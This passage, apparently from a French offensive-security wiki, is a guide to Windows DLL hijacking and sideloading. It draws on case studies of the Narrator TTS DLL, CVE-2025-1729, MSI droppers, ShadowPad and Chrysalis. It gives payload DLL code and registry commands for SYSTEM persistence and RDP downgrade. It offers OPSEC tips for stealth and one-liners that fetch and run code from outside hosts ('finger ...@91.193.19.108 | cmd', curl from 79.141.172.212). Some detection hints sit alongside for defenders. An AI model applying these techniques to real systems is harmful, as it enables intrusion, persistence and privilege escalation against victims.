        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Étude de cas : détournement de DLL de localisation Narrator OneCore TTS (accessibilité/ATs)

Windows Narrator.exe teste toujours au démarrage la présence d’une DLL de localisation prévisible, propre à la langue. Celle-ci peut être détournée pour exécuter du code arbitraire et assurer la persistance.<sup>[[7]](#references)</sup>

Faits clés
- Chemin testé (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ancien chemin (versions antérieures) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l’attaquant et accessible en écriture se trouve au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucun export n’est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci-dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC : discrétion
- Un hijack naïf fera parler le Narrator ou mettra l’interface en évidence. Pour rester discret, lors de l’attachement, énumérez les threads du Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et suspendez-le avec `SuspendThread` ; poursuivez dans votre propre thread. Consultez le PoC pour le code complet.<sup>[[8]](#references)</sup>

Déclenchement et persistance via la configuration Accessibility
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec les paramètres ci-dessus, le lancement du Narrator charge la DLL déposée. Sur le bureau sécurisé (écran de connexion), appuyez sur CTRL+WIN+ENTER pour lancer le Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.

Exécution SYSTEM déclenchée par RDP (mouvement latéral)
- Autorisez la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connectez-vous à l’hôte par RDP, puis, à l’écran de connexion, appuyez sur CTRL+WIN+ENTER pour lancer le Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.
- L’exécution s’arrête à la fermeture de la session RDP : injectez ou migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un outil Accessibility (AT) intégré (par exemple, CursorIndicator), la modifier pour qu’elle pointe vers un binaire ou une DLL arbitraire, l’importer, puis définir `configuration` sur le nom de cet AT. Cela permet d’exécuter du code arbitraire via le framework Accessibility.

Remarques
- L’écriture dans `%windir%\System32` et la modification des valeurs HKLM nécessitent des droits administrateur.
- Toute la logique du payload peut se trouver dans `DLL_PROCESS_ATTACH` ; aucun export n’est nécessaire.

## Étude de cas : CVE-2025-1729 - Privilege Escalation via TPQMAssistant.exe

Ce cas illustre le **Phantom DLL Hijacking** dans le TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), suivi sous le numéro **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Détails de la vulnérabilité

- **Composant** : `TPQMAssistant.exe`, situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute chaque jour à 9 h 30 dans le contexte de l’utilisateur connecté.
- **Autorisations du répertoire** : le répertoire est accessible en écriture par `CREATOR OWNER`, ce qui permet aux utilisateurs locaux d’y déposer des fichiers arbitraires.
- **Comportement de recherche des DLL** : le programme tente d’abord de charger `hostfxr.dll` depuis son répertoire de travail et consigne « NAME NOT FOUND » si le fichier est absent, ce qui indique que le répertoire local est prioritaire dans l’ordre de recherche.

### Mise en œuvre de l’exploit

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire et exploiter l’absence de la DLL pour exécuter du code dans le contexte de l’utilisateur :

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flux d’attaque

1. En tant qu’utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez que la tâche planifiée s’exécute à 9:30 sous le contexte de l’utilisateur actuel.
3. Si un administrateur est connecté lorsque la tâche s’exécute, la DLL malveillante s’exécute dans la session de l’administrateur avec une intégrité moyenne.
4. Enchaînez les techniques standard de contournement de l’UAC pour élever les privilèges, de l’intégrité moyenne à SYSTEM.

## Étude de cas : Dropper MSI CustomAction + DLL Side-Loading via un hôte signé (wsc_proxy.exe)

Les acteurs malveillants associent souvent des droppers basés sur MSI au DLL side-loading afin d’exécuter des payloads dans un processus signé et de confiance.<sup>[[10]](#references)</sup>

Vue d’ensemble de la chaîne
- L’utilisateur télécharge un MSI. Une CustomAction s’exécute silencieusement pendant l’installation graphique (par exemple, LaunchApplication ou une action VBScript) et reconstitue l’étape suivante à partir des ressources intégrées.
- Le dropper écrit un EXE légitime et signé ainsi qu’une DLL malveillante dans le même répertoire (exemple de paire : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l’attaquant).
- Lorsque l’EXE signé est lancé, l’ordre de recherche des DLL de Windows charge d’abord wsc.dll depuis le répertoire de travail, exécutant le code de l’attaquant sous un processus parent signé (ATT&CK T1574.001).

Analyse MSI (éléments à rechercher)
- Table CustomAction :
  - Recherchez les entrées qui exécutent des fichiers exécutables ou du VBScript. Exemple de modèle suspect : LaunchApplication exécutant en arrière-plan un fichier intégré.
  - Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés/répartis dans le CAB du MSI :
  - Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ou utilisez lessmsi : lessmsi x package.msi C:\out
  - Recherchez plusieurs petits fragments concaténés et déchiffrés par une CustomAction VBScript. Flux courant :

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
  - wsc_proxy.exe : hôte signé légitime (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
  - wsc.dll : DLL de l’attaquant. Si aucun export spécifique n’est requis, DllMain peut suffire ; sinon, créez une DLL proxy et transférez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Pour les exigences d’exportation, utilisez un framework de proxying (par ex., DLLirant/Spartacus) pour générer une DLL de forwarding qui exécute également votre payload.

- Cette technique repose sur la résolution des noms de DLL par le binaire hôte. Si l’hôte utilise des chemins absolus ou des indicateurs de chargement sécurisé (par ex., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les exports forwardés peuvent influer sur l’ordre de priorité et doivent être pris en compte lors du choix du binaire hôte et de l’ensemble d’exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad à l’aide d’une **triade de trois fichiers** pour se fondre dans des logiciels légitimes tout en conservant le payload principal chiffré sur le disque :<sup>[[12]](#references)</sup>

1. **EXE hôte signé** – des éditeurs tels qu’AMD, Realtek ou NVIDIA sont détournés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour le faire ressembler à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **DLL loader malveillante** – déposée à côté de l’EXE sous un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, de le déchiffrer et de mapper ShadowPad de manière réfléchie.
3. **Blob payload chiffré** – souvent stocké sous la forme `<name>.tmp` dans le même répertoire. Après avoir mappé en mémoire le payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensiques.

Notes de tradecraft :

* Renommer l’EXE signé (tout en conservant le `OriginalFileName` d’origine dans l’en-tête PE) lui permet de se faire passer pour un binaire Windows tout en gardant la signature de l’éditeur. Reprenez donc l’habitude d’Ink Dragon de déposer des binaires ressemblant à `conhost.exe`, mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l’exécutable reste de confiance, la plupart des contrôles d’allowlisting exigent seulement que votre DLL malveillante se trouve à côté. Concentrez-vous sur la personnalisation de la DLL loader ; le parent signé peut généralement s’exécuter sans modification.
* Le déchiffreur de ShadowPad s’attend à ce que le blob TMP se trouve à côté du loader et soit accessible en écriture afin de pouvoir mettre le fichier à zéro après le mapping. Gardez le répertoire accessible en écriture jusqu’au chargement du payload ; une fois celui-ci en mémoire, le fichier TMP peut être supprimé sans risque pour l’OPSEC.

### Chaîne de sideloading d’archive par étapes avec stager LOLBAS (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS pour que le seul artefact personnalisé sur le disque soit la DLL malveillante placée à côté de l’EXE de confiance :<sup>[[1]](#references)</sup>

- **Loader de commandes à distance (Finger) :** PowerShell masqué lance `cmd.exe /c`, récupère des commandes depuis un serveur Finger et les transmet à `cmd` :

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` récupère du texte via TCP/79 ; `| cmd` exécute la réponse du serveur, permettant aux opérateurs de faire tourner le serveur de second stage côté serveur.

- **Téléchargement/extraction intégré :** Téléchargez une archive avec une extension anodine, décompressez-la, puis placez la cible de sideload et la DLL dans un dossier `%LocalAppData%` aléatoire :

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise l’outil tar intégré à Windows.

- **Lancement via WMI/CIM :** Démarrez l’EXE via WMI afin que la télémétrie indique un processus créé par CIM pendant qu’il charge la DLL située dans le même répertoire :

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Fonctionne avec des binaires qui privilégient les DLL locales (p. ex., `intelbq.exe`, `nearby_share.exe`) ; le payload (p. ex., Remcos) s’exécute sous un nom de confiance.

- **Détection :** déclencher une alerte sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; combinaison rare en dehors des scripts d’administration.


## Étude de cas : dropper NSIS + sideload du Bitdefender Submission Wizard (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d’une chaîne de mise à jour de confiance pour livrer un dropper empaqueté avec NSIS, qui a déployé un sideload de DLL ainsi que des payloads entièrement en mémoire.<sup>[[13]](#references)</sup>

Déroulement des opérations
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque comme **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, une DLL malveillante `log.dll` et un blob chiffré `BluetoothService`, puis lance l’EXE.
- L’EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob avec mmap ; `LogWrite` le déchiffre à l’aide d’un flux personnalisé basé sur un LCG (constantes **0x19660D** / **0x3C6EF35F**, matériel de clé dérivé d’un hash précédent), écrase le buffer avec le shellcode en clair, libère les données temporaires et lui transfère l’exécution.
- Pour éviter l’IAT, le loader résout les API en hachant les noms des exports avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant une fonction d’avalanche de type Murmur (**0x85EBCA6B**) et en comparant le résultat aux hashes cibles salés.

Shellcode principal (Chrysalis)
- Déchiffre un module principal de type PE en répétant des opérations d’addition/XOR/soustraction avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit à l’exécution les chaînes de noms de DLL à l’aide de transformations rotation de bits/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un deuxième résolveur qui parcourt **PEB → InMemoryOrderModuleList**, analyse chaque table d’exports par blocs de 4 octets avec un mélange de type Murmur, et ne recourt à `GetProcAddress` que si le hash est introuvable.

Configuration intégrée et C2
- La configuration se trouve dans le fichier `BluetoothService` déposé à **l’offset 0x30808** (taille **0x980**) et est déchiffrée avec RC4 à l’aide de la clé `qwhvb^435h&*7`, révélant l’URL C2 et le User-Agent.
- Les beacons construisent un profil d’hôte délimité par des points, ajoutent le tag `4Q` au début, puis chiffrent le tout avec RC4 à l’aide de la clé `vAuig34%^325hGV` avant l’appel à `HttpSendRequestA` sur HTTPS. Les réponses sont déchiffrées avec RC4, puis distribuées via un aiguillage par tag (`4T` shell, `4V` exécution de processus, `4W/4X` écriture de fichier, `4Y` lecture/exfiltration, `4\\` désinstallation, `4` énumération des lecteurs/fichiers + cas de transfert par blocs).
- Le mode d’exécution dépend des arguments CLI : sans argument = installation de la persistance (service/clé Run) pointant vers `-i` ; `-i` relance le programme avec `-k` ; `-k` ignore l’installation et exécute le payload.

Autre loader observé
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le code source C fourni par l’attaquant intégrait du shellcode, le compilait et l’exécutait en mémoire sans écrire de PE sur le disque. Reproduire avec :

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Cette étape de compilation-exécution basée sur TCC a importé `Wininet.dll` à l’exécution et récupéré un shellcode de deuxième étape depuis une URL codée en dur, offrant ainsi un loader flexible qui se fait passer pour une compilation.

## Sideloading d’un hôte signé avec export proxying + mise en attente du thread de l’hôte

Certaines chaînes de DLL sideloading ajoutent des **mécanismes de stabilité** pour que l’hôte légitime reste actif assez longtemps afin de charger proprement les étapes ultérieures, au lieu de planter après le chargement de la DLL malveillante.<sup>[[11]](#references)</sup>

Schéma observé
- Déposer un EXE de confiance à côté d’une DLL malveillante portant le nom de dépendance attendu, par exemple `version.dll`.
- La DLL malveillante **fait office de proxy pour chaque export attendu** et les redirige vers la véritable DLL système (par exemple `%SystemRoot%\\System32\\version.dll`), afin que la résolution des imports aboutisse et que le processus hôte continue de fonctionner.
- Après son chargement, la DLL malveillante **patche le point d’entrée de l’hôte** pour que le thread principal entre dans une boucle infinie `Sleep`, au lieu de se terminer ou d’exécuter des chemins de code qui mettraient fin au processus.
- Un nouveau thread effectue le véritable travail malveillant : déchiffrer le nom ou le chemin de la DLL de l’étape suivante (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying normal de DLL préserve la compatibilité des API, mais ne garantit pas que l’hôte reste actif assez longtemps pour les étapes ultérieures.
- Mettre le thread principal en attente avec `Sleep(INFINITE)` est une méthode simple pour garder le processus signé en mémoire pendant que le loader effectue le déchiffrement, le staging ou l’amorçage réseau dans un thread de travail.
- Une recherche portant uniquement sur un `DllMain` suspect peut passer à côté de ce schéma si le comportement intéressant survient après le patch du point d’entrée de l’hôte et le démarrage d’un thread secondaire.

Workflow minimal
1. Copier l’EXE signé et déterminer quelle DLL il résout depuis le répertoire local.
2. Créer une DLL proxy qui exporte les mêmes fonctions et les redirige vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un thread de travail.
4. Depuis ce thread, patcher le point d’entrée de l’hôte ou la routine de démarrage du thread principal pour qu’il boucle sur `Sleep`.
5. Déchiffrer le nom/la configuration de la DLL de l’étape suivante et appeler `LoadLibrary` ou mapper manuellement la charge utile.

Pistes de détection
- Des processus signés qui chargent `version.dll` ou des bibliothèques courantes similaires depuis leur propre répertoire d’application plutôt que depuis `System32`.
- Des patches mémoire au point d’entrée du processus peu après le chargement de l’image, en particulier des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Des threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une deuxième DLL dont le nom a été déchiffré.
- Des DLL proxy exportant l’ensemble des fonctions, placées à côté d’exécutables de fournisseurs dans des répertoires de staging modifiables tels que `ProgramData`, `%TEMP%` ou des chemins d’archives décompressées.

## References

- [1] [Red Canary – Aperçus des renseignements : janvier 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Élévation de privilèges via TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT : DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking sous Windows. Exemple simple en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore déploie un nouveau malware ciblant l’Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility : quand les DLL Hijacks rencontrent les assistants Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers numériques : anatomie de campagnes d’usurpation en évolution distribuant Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Convergence des intérêts : analyse de groupes de menaces ciblant un gouvernement d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dans les coulisses d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis : analyse approfondie de l’arsenal de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Chaîne HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Suivi des campagnes d’espionnage 2026 du groupe iranien APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Élément `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Élément `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Élément `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Élément `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Élément `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Élément `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rapides et furieux : opérations de Nimbus Manticore pendant le conflit iranien](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Actions de tâche](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cible des gouvernements et des infrastructures critiques d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
